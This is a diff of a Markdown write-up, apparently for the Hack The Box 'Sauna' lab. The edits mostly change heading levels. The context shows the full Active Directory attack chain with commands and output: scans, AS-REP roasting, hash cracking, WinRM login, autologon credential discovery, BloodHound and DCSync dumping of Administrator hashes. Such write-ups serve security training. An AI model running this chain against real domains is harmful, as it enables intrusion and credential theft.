@@ -11,9 +11,9 @@ excerpt: "Sauna is an easy-level machine that challenges you to perform internal
 
 **Sauna** is an easy-level machine that challenges you to perform internal network penetration testing within an Active Directory environment. It involves techniques such as website OSINT for gathering potential usernames, BloodHound enumeration for mapping attack paths, and executing DCSync attacks to extract password hashes.
 
-# ENUMERATION
+## ENUMERATION
 ---
-## Nmap scanning
+### Nmap scanning
 ---
 ````bash
 nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.175 -sCV -vvv
@@ -67,7 +67,7 @@ Host script results:
 
 After analyzing the Nmap scan, we can deduce that we are dealing with an Active Directory environment. The presence of a web server on port 80 raises suspicion, as it is quite uncommon and generally inadvisable to have a publicly accessible web service within a corporate environment. However, before enumerating the web server, we will proceed to test the SMB service.
 
-## Enumerating SMB as anonymous and guest.
+### Enumerating SMB as anonymous and guest.
 ---
 ````bash
 ❯ crackmapexec smb 10.10.10.175 -u '' -p ''
@@ -80,7 +80,7 @@ SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\g
 
 Unfortunately, we do not have any access to the SMB service as either an anonymous or guest user. Therefore, we proceed to enumerate the web server in search of information that might help us identify a potential attack vector.
 
-## Enumerating of the web service at port 80
+### Enumerating of the web service at port 80
 ---
 While enumerating the web server, we discovered potential employee names from the company. However, we are unsure of the naming convention used within the Active Directory. As a result, we have created our own custom wordlist and will test it to determine if any of the entries correspond to valid usernames.
 ![Usersweb](/assets/saune/usernames.png)
@@ -96,7 +96,7 @@ File: users.txt
    6   │ steven kerb
 ````
 ---
-## Making our wordlist to check for kerberos pre-authentication vulnerability
+### Making our wordlist to check for kerberos pre-authentication vulnerability
 ---
 ````bash
 ./username-anarchy --input-file /home/whare/hackthebox/maquinas/saune/users.txt  --select-format first,flast,first.last,firstl > test_users.txt
@@ -129,8 +129,8 @@ File: test_users.txt
   24   │ skerb
 ````
 
-## AS-REP ATTACK
-
+### AS-REP ATTACK
+---
 Using the previously created wordlist, we will utilize the `GetNPUsers.py`. Additionally, this will allow us to perform an AS-REP attack.
 
 An AS-REP attack exploits accounts in Active Directory that have the "Do not require Kerberos preauthentication" option enabled. When this setting is active, it allows an attacker to request an encrypted Ticket Granting Ticket (TGT) directly from the Key Distribution Center (KDC). The encrypted TGT can then be brute-forced offline to retrieve the user's plaintext password.
@@ -147,7 +147,7 @@ se)
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3708af00938c26b656cf302185329388$492ef8d2268cc851566269e07d569cde905999c89c5bf96ac130b0bb1ca3fc2b92a8ae718eee3adb5cfc49a4f60c19a4991120804262e4331d55380998b01a42e666de338b4d0210bbe316eaa9bde84f116437dcd977e79921df060e0fd5dfe66872c12ebe8a3205be9ab0aacc7e362d57f9d7d192953110e212357d7ed988b8b3ae4272210cafd2c07aad52512ce9f94226677792982d32242abb431011b98cdb66be0381db95221896e490bf74c95e1cee43fa45171524393dbeb8250701c568145644ae652ef97a1fe8960c49484a216f49124496c2fe02843c8716ddd2fc7893c31554015bb97ac9503e2dc53976ffc67efa2ae309061b2477b11109b326
 ````
-## Password cracking
+### Password cracking
 ---
 We successfully identified a valid user that does not require Kerberos preauthentication. As a result, we were able to obtain the TGT, which we will proceed to decrypt using John the Ripper and our most common wordlist to gain access.
 
@@ -166,7 +166,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ````
 
-# FOOTHOLD
+## FOOTHOLD
 ---
 During our previous enumeration with Nmap, we noticed that the WinRM port was open:
 
@@ -196,7 +196,7 @@ Mode                LastWriteTime         Length Name
 -ar---        1/28/2025   2:54 PM             34 user.txt
 ````
 
-# AUTHENTICATED ENUMERATION
+### Authenticated enumeration
 ---
 We will transfer WinPEAS to the machine to see if we can find any interesting information before resorting to more complex methods.
 
@@ -221,7 +221,7 @@ The `svc_loanmanager` service is typically responsible for managing and automati
     DefaultPassword               :  Moneymakestheworldgoround!
 ````
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 ---
 We logged into the new user account using Evil-WinRM, and after running WinPEAS again, we did not find anything of particular interest.
 
@@ -238,7 +238,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
 ````
 
-## Blooudhound enumeration
+### Blooudhound enumeration
 ---
 Therefore, we will resort to more advanced techniques. However, once you begin to understand and properly use BloodHound, the doors to privilege escalation open up wide!
 
@@ -274,6 +274,7 @@ After running SharpHound, we will transfer the data to our local machine and run
 **Neo4j console** is a graph database management system used by BloodHound to visualize and query the collected Active Directory data. It helps represent the relationships and trust paths in a graph format, making it easier to identify attack vectors and escalation paths.
 
 **DISCLAIMER**: If you are using **BloodHound** installed from Kali's APT repository, you will need to run **SharpHound v1.1.0**. Otherwise, your data will not load properly.
+You can download it from <a href="https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.0" target="_blank">here</a> 
 
 Now we can open our **bloodhound** to upload our recolected data
 ![img-description](/assets/saune/upload.png){: .normal }
@@ -338,7 +339,8 @@ Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
 Administrator:des-cbc-md5:fb8f321c64cea87f
 [*] Cleaning up... 
 ````
-
+## LOGIN AS ADMINISTRATOR
+---
 After that, we simply copy the credentials and log in using Evil-WinRM and GG WP.
 
 ````powershell
